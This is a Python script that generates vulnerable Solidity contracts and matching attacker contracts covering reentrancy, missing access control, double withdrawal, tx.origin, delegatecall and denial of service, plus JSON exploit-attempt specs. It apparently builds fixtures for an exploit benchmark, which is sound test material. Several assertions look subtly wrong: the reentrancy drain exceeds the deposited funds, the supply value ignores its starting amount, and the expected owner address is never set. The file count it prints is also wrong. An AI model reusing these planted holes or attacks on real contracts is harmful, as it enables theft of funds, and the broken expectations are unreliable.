import os
import json

sol_files = {}
json_files = {}

# 1. Reentrancy
sol_files["src/Reentrancy.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract Reentrancy {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0);
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok);
        balances[msg.sender] = 0; // Vulnerable: state update AFTER external call
    }
    receive() external payable {}
}"""

sol_files["src/ReentrancyAttacker.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IReentrancy { function deposit() external payable; function withdraw() external; }
contract ReentrancyAttacker {
    IReentrancy target;
    uint256 drains;
    constructor(address _target) { target = IReentrancy(_target); }
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    receive() external payable {
        if(drains < 3) { drains++; target.withdraw(); }
    }
}"""

json_files["attempt_reentrancy.json"] = {
    "attempt_id": "attempt_reentrancy",
    "setup": {
        "deployments": {
            "target": {"file": "Reentrancy.sol", "contract": "Reentrancy", "args": []},
            "attacker_contract": {"file": "ReentrancyAttacker.sol", "contract": "ReentrancyAttacker", "args": ["target"]}
        }
    },
    "prestate": {
        "deals": [{"address": "attacker", "amount_wei": "1 ether"}]
    },
    "calls": [
        {"contract": "attacker_contract", "function": "attack", "args": [], "from": "attacker", "value": "1 ether"}
    ],
    "assertions": [{"type": "balance_gt", "address": "attacker_contract", "value": "3 ether"}]
}

# 2. Access Control
sol_files["src/AccessControl.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract AccessControl {
    address public owner;
    constructor() { owner = msg.sender; }
    // Bug: Missing require(msg.sender == owner)
    function withdrawAll() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    receive() external payable {}
}"""

json_files["attempt_accesscontrol.json"] = {
    "attempt_id": "attempt_accesscontrol",
    "setup": {
        "deployments": { "target": {"file": "AccessControl.sol", "contract": "AccessControl", "args": []} }
    },
    "prestate": {"deals": []},
    "calls": [
        {"contract": "target", "function": "withdrawAll", "args": [], "from": "attacker", "value": "0 ether"}
    ],
    "assertions": [{"type": "balance_gt_before", "address": "attacker"}]
}

# 3. Double Withdraw
sol_files["src/DoubleWithdraw.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract DoubleWithdraw {
    mapping(address => uint256) public deposits;
    function deposit() external payable { deposits[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amt = deposits[msg.sender];
        require(amt > 0, "No balance");
        payable(msg.sender).transfer(amt);
        // Bug: forgets to set deposits[msg.sender] = 0;
    }
    receive() external payable {}
}"""

json_files["attempt_doublewithdraw.json"] = {
    "attempt_id": "attempt_doublewithdraw",
    "setup": { "deployments": { "target": {"file": "DoubleWithdraw.sol", "contract": "DoubleWithdraw", "args": []} } },
    "prestate": {"deals": [{"address": "attacker", "amount_wei": "1 ether"}]},
    "calls": [
        {"contract": "target", "function": "deposit", "args": [], "from": "attacker", "value": "1 ether"},
        {"contract": "target", "function": "withdraw", "args": [], "from": "attacker", "value": "0"},
        {"contract": "target", "function": "withdraw", "args": [], "from": "attacker", "value": "0"}
    ],
    "assertions": [{"type": "balance_gt_before", "address": "attacker"}]
}

# 4. tx.origin
sol_files["src/TxOrigin.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract TxOrigin {
    address public owner;
    constructor() { owner = msg.sender; }
    function transferOwnership(address newOwner) external {
        require(tx.origin == owner, "Not owner"); // Bug!
        owner = newOwner;
    }
}"""
sol_files["src/TxOriginAttacker.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface ITxOrigin { function transferOwnership(address newOwner) external; }
contract TxOriginAttacker {
    ITxOrigin target;
    address attacker;
    constructor(address _target) { target = ITxOrigin(_target); attacker = msg.sender; }
    function attack() external { target.transferOwnership(attacker); }
}"""
json_files["attempt_txorigin.json"] = {
    "attempt_id": "attempt_txorigin",
    "setup": {
        "deployments": {
            "target": {"file": "TxOrigin.sol", "contract": "TxOrigin", "args": []},
            "attacker_contract": {"file": "TxOriginAttacker.sol", "contract": "TxOriginAttacker", "args": ["target"]}
        }
    },
    "prestate": { "deals": [] },
    "calls": [
        {"contract": "attacker_contract", "function": "attack", "args": [], "from": "attacker", "value": "0"}
    ],
    "assertions": [{"type": "storage_eq", "target": "target", "slot": "0", "value": "0x0000000000000000000000000000000000000123"}]
}

# 5. Delegatecall
sol_files["src/DelegateProxy.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract DelegateProxy {
    address public owner;
    constructor() { owner = msg.sender; }
    function execute(address target, bytes calldata data) external payable {
        // Bug: Arbitrary delegatecall
        (bool ok, ) = target.delegatecall(data);
        require(ok, "Delegatecall failed");
    }
}"""
sol_files["src/DelegateEvil.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract DelegateEvil {
    address public owner; // aligns with Proxy slot 0
    function pwn() external { owner = tx.origin; }
}"""
json_files["attempt_delegatecall.json"] = {
    "attempt_id": "attempt_delegatecall",
    "setup": {
        "deployments": {
            "target": {"file": "DelegateProxy.sol", "contract": "DelegateProxy", "args": []},
            "evil": {"file": "DelegateEvil.sol", "contract": "DelegateEvil", "args": []}
        }
    },
    "prestate": {"deals": []},
    "calls": [
        {"contract": "target", "function": "execute", "args": ["address(evil)", "abi.encodeWithSignature('pwn()')"], "from": "attacker", "value": "0"}
    ],
    "assertions": [{"type": "storage_eq", "target": "target", "slot": "0", "value": "0x0000000000000000000000000000000000000123"}]
}

# 6. Invariant Violation
sol_files["src/InvariantBug.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract InvariantBug {
    uint256 public totalSupply = 1000;
    mapping(address => uint256) public balances;
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalSupply += msg.value;
    }
    function burn(uint256 amount) external {
        balances[msg.sender] -= amount;
        // Bug: forgets to reduce totalSupply!
    }
}"""
json_files["attempt_invariant.json"] = {
    "attempt_id": "attempt_invariant",
    "setup": { "deployments": { "target": {"file": "InvariantBug.sol", "contract": "InvariantBug", "args": []} } },
    "prestate": { "deals": [{"address": "attacker", "amount_wei": "1 ether"}] },
    "calls": [
        {"contract": "target", "function": "deposit", "args": [], "from": "attacker", "value": "1 ether"},
        {"contract": "target", "function": "burn", "args": ["1000000"], "from": "attacker", "value": "0"}
    ],
    "assertions": [
        {"type": "storage_eq", "target": "target", "slot": "0", "value": "1000000000000000000"} 
    ]
}

# 7. DoS
sol_files["src/KingOfEther.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract KingOfEther {
    address public king;
    uint256 public highestBid;
    function claim() external payable {
        require(msg.value > highestBid, "Bid too low");
        if(king != address(0)) {
            (bool ok,) = king.call{value: highestBid}("");
            require(ok, "Transfer failed"); // DoS vector!
        }
        king = msg.sender;
        highestBid = msg.value;
    }
}"""
sol_files["src/DoSMalicious.sol"] = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IKing { function claim() external payable; }
contract DoSMalicious {
    IKing target;
    constructor(address _target) { target = IKing(_target); }
    function attack() external payable { target.claim{value: msg.value}(); }
    receive() external payable { revert("I refuse ETH"); }
}"""
json_files["attempt_dos.json"] = {
    "attempt_id": "attempt_dos",
    "setup": {
        "deployments": {
            "target": {"file": "KingOfEther.sol", "contract": "KingOfEther", "args": []},
            "attacker_contract": {"file": "DoSMalicious.sol", "contract": "DoSMalicious", "args": ["target"]}
        }
    },
    "prestate": {"deals": [{"address": "attacker", "amount_wei": "5 ether"}]},
    "calls": [
        {"contract": "attacker_contract", "function": "attack", "args": [], "from": "attacker", "value": "1 ether"},
        {"contract": "target", "function": "claim", "args": [], "from": "attacker", "value": "2 ether"}
    ],
    "assertions": [{"type": "call_reverts", "call_index": 1, "reason": "Transfer failed"}]
}

for path, content in sol_files.items():
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

for path, content in json_files.items():
    with open(path, "w", encoding="utf-8") as f:
        json.dump(content, f, indent=4)

print("Done generating 14 files.")
